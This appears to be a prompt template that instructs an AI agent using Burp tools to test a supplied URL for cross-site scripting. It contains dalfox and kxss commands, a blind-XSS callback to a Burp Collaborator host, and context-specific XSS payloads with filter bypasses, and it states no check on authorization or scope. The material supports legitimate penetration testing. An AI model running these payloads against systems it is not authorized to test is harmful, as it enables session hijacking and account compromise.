---
description: Test for XSS vulnerabilities on a URL or parameter.
---

XSS testing on: $ARGUMENTS

Use Burp MCP and tools to test:

## Reflected XSS
```bash
# Dalfox for automated testing
dalfox url "$ARGUMENTS" -b http://your-collaborator-id.burpcollaborator.net -o /tmp/xss.txt --skip-bav

# KXSS for quick detection
echo "$ARGUMENTS" | kxss
```

## Manual Payloads by Context

### HTML Context
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

### Attribute Context
```html
" onfocus=alert(1) autofocus="
' onfocus=alert(1) autofocus='
" onmouseover=alert(1) "
```

### JavaScript Context
```javascript
'-alert(1)-'
';alert(1);//
</script><script>alert(1)</script>
```

### CSS Context
```css
}</style><script>alert(1)</script>
```

### Filter Bypass
```html
<ScRiPt>alert(1)</sCrIpT>
<img src=x onerror=alert&#40;1&#41;>
<svg/onload=alert(1)>
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

## Blind XSS
- Inject in User-Agent, Referer, comment fields
- Use Burp Collaborator or hook URL
- Monitor for callback

For each finding provide:
- Payload used
- Response showing execution
- Impact (cookie theft, session hijack, etc.)
- Severity
